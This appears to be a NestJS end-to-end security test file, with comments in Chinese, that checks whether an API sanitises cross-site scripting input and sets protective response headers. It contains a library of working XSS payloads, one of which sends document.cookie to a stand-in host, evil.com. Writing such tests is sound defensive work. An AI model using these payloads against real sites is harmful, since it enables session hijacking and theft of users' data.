import { Test, TestingModule } from '@nestjs/testing';
import { INestApplication, ValidationPipe } from '@nestjs/common';
import * as request from 'supertest';
import { AppModule } from '../../src/app.module';

/**
 * XSS（跨站脚本）防护测试
 * 
 * 验证系统能够防御各种XSS攻击向量：
 * - 存储型XSS
 * - 反射型XSS
 * - DOM型XSS
 * - 各种编码绕过
 */
describe('XSS防护测试 (Security)', () => {
  let app: INestApplication;

  beforeAll(async () => {
    const moduleFixture: TestingModule = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleFixture.createNestApplication();
    app.setGlobalPrefix('api/v1');
    app.useGlobalPipes(
      new ValidationPipe({
        whitelist: true,
        forbidNonWhitelisted: true,
        transform: true,
      }),
    );
    await app.init();
  });

  afterAll(async () => {
    await app.close();
  });

  // ==================== XSS载荷库 ====================
  const XSS_PAYLOADS = {
    basic: [
      '<script>alert("xss")</script>',
      '<script>alert(document.cookie)</script>',
      '<script>document.location="http://evil.com/?c="+document.cookie</script>',
    ],
    imgTag: [
      '<img src=x onerror=alert("xss")>',
      '<img src="javascript:alert(1)">',
      '<img """><script>alert("xss")</script>">',
      '<img src=x onerror="alert&#40;1&#41;">',
    ],
    eventHandler: [
      '<body onload=alert("xss")>',
      '<input onfocus=alert("xss") autofocus>',
      '<marquee onstart=alert("xss")>',
      '<details open ontoggle=alert("xss")>',
      '<svg onload=alert("xss")>',
      '<svg/onload=alert("xss")>',
    ],
    encoding: [
      '<script>alert(String.fromCharCode(88,83,83))</script>',
      '&#60;script&#62;alert("xss")&#60;/script&#62;',
      '%3Cscript%3Ealert("xss")%3C/script%3E',
      '\\x3cscript\\x3ealert("xss")\\x3c/script\\x3e',
      '\\u003cscript\\u003ealert("xss")\\u003c/script\\u003e',
    ],
    advanced: [
      '"><script>alert("xss")</script>',
      "'-alert('xss')-'",
      '{{constructor.constructor("alert(1)")()}}',
      '${alert(1)}',
      '<iframe src="javascript:alert(1)">',
      '<object data="javascript:alert(1)">',
      '<embed src="javascript:alert(1)">',
      '<link rel=import href="data:text/html,<script>alert(1)</script>">',
      '<math><mtext></mtext><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">',
    ],
    cssInjection: [
      '<div style="background:url(javascript:alert(1))">',
      '<div style="width:expression(alert(1))">',
      '<style>@import"javascript:alert(1)"</style>',
    ],
    protocolHandlers: [
      'javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>',
      'vbscript:alert(1)',
    ],
  };

  let authToken: string;

  beforeAll(async () => {
    try {
      const res = await request(app.getHttpServer())
        .post('/api/v1/auth/login')
        .send({ email: 'test@matrixflow.com', password: 'Test123!' });
      authToken = res.body?.data?.accessToken;
    } catch {
      authToken = 'test-token';
    }
  });

  describe('注册接口 XSS防护', () => {
    Object.entries(XSS_PAYLOADS).forEach(([category, payloads]) => {
      describe(`${category} 类型`, () => {
        payloads.forEach((payload) => {
          it(`应拒绝XSS载荷（name字段）: ${payload.substring(0, 60)}...`, async () => {
            const response = await request(app.getHttpServer())
              .post('/api/v1/auth/register')
              .send({
                email: 'xss-test@test.com',
                password: 'Test123!',
                name: payload,
              });

            if (response.status === 201) {
              // 如果注册成功，验证返回的数据已被净化
              const body = JSON.stringify(response.body);
              expect(body).not.toContain('<script>');
              expect(body).not.toContain('javascript:');
              expect(body).not.toContain('onerror');
              expect(body).not.toContain('onload');
            }
          });
        });
      });
    });
  });

  describe('用户资料更新 XSS防护', () => {
    it('应净化name字段中的XSS', async () => {
      const response = await request(app.getHttpServer())
        .put('/api/v1/users/me')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          name: '<script>alert("xss")</script>',
        });

      if (response.status === 200) {
        expect(JSON.stringify(response.body)).not.toContain('<script>');
      }
    });

    it('应净化phone字段中的XSS', async () => {
      const response = await request(app.getHttpServer())
        .put('/api/v1/users/me')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          phone: '<img src=x onerror=alert(1)>',
        });

      if (response.status === 200) {
        expect(JSON.stringify(response.body)).not.toContain('onerror');
      }
    });

    it('应净化avatar字段中的XSS', async () => {
      const response = await request(app.getHttpServer())
        .put('/api/v1/users/me')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          avatar: 'javascript:alert(document.cookie)',
        });

      if (response.status === 200) {
        expect(response.body?.data?.avatar).not.toMatch(/^javascript:/i);
      }
    });
  });

  describe('账号创建 XSS防护', () => {
    it('应净化nickname字段', async () => {
      const response = await request(app.getHttpServer())
        .post('/api/v1/accounts')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          platform: 'DOUYIN',
          platformUserId: 'xss-test-user',
          nickname: '<script>alert("xss")</script>',
        });

      if (response.status === 201) {
        expect(JSON.stringify(response.body)).not.toContain('<script>');
      }
    });

    it('应净化bio字段', async () => {
      const response = await request(app.getHttpServer())
        .post('/api/v1/accounts')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          platform: 'DOUYIN',
          platformUserId: 'xss-bio-test',
          nickname: 'test',
          bio: '<img src=x onerror=alert("xss")>',
        });

      if (response.status === 201) {
        expect(JSON.stringify(response.body)).not.toContain('onerror');
      }
    });
  });

  describe('内容创建 XSS防护', () => {
    it('应净化title字段', async () => {
      const response = await request(app.getHttpServer())
        .post('/api/v1/content')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          title: '<svg onload=alert("xss")>',
          content: 'normal content',
          accountId: 'test-account-id',
        });

      if (response.status === 201) {
        expect(JSON.stringify(response.body)).not.toContain('<svg');
        expect(JSON.stringify(response.body)).not.toContain('onload');
      }
    });

    it('应净化content字段', async () => {
      const response = await request(app.getHttpServer())
        .post('/api/v1/content')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          title: 'Normal Title',
          content: '<iframe src="javascript:alert(1)"></iframe>',
          accountId: 'test-account-id',
        });

      if (response.status === 201) {
        expect(JSON.stringify(response.body)).not.toContain('<iframe');
        expect(JSON.stringify(response.body)).not.toContain('javascript:');
      }
    });
  });

  describe('团队创建 XSS防护', () => {
    it('应净化team name字段', async () => {
      const response = await request(app.getHttpServer())
        .post('/api/v1/teams')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          name: '"><script>alert("xss")</script>',
        });

      if (response.status === 201) {
        expect(JSON.stringify(response.body)).not.toContain('<script>');
      }
    });
  });

  describe('响应头安全检查', () => {
    it('应设置X-Content-Type-Options: nosniff', async () => {
      const response = await request(app.getHttpServer())
        .get('/api/v1/users/me')
        .set('Authorization', `Bearer ${authToken}`);

      expect(response.headers['x-content-type-options']).toBe('nosniff');
    });

    it('应设置X-Frame-Options', async () => {
      const response = await request(app.getHttpServer())
        .get('/api/v1/users/me')
        .set('Authorization', `Bearer ${authToken}`);

      expect(
        response.headers['x-frame-options'] === 'DENY' ||
        response.headers['x-frame-options'] === 'SAMEORIGIN'
      ).toBe(true);
    });

    it('应设置X-XSS-Protection', async () => {
      const response = await request(app.getHttpServer())
        .get('/api/v1/users/me')
        .set('Authorization', `Bearer ${authToken}`);

      // 现代浏览器建议 "0"（禁用XSS过滤器，使用CSP代替）
      expect(response.headers['x-xss-protection']).toBeDefined();
    });

    it('Content-Type应正确设置', async () => {
      const response = await request(app.getHttpServer())
        .get('/api/v1/users/me')
        .set('Authorization', `Bearer ${authToken}`);

      expect(response.headers['content-type']).toMatch(/application\/json/);
    });
  });
});
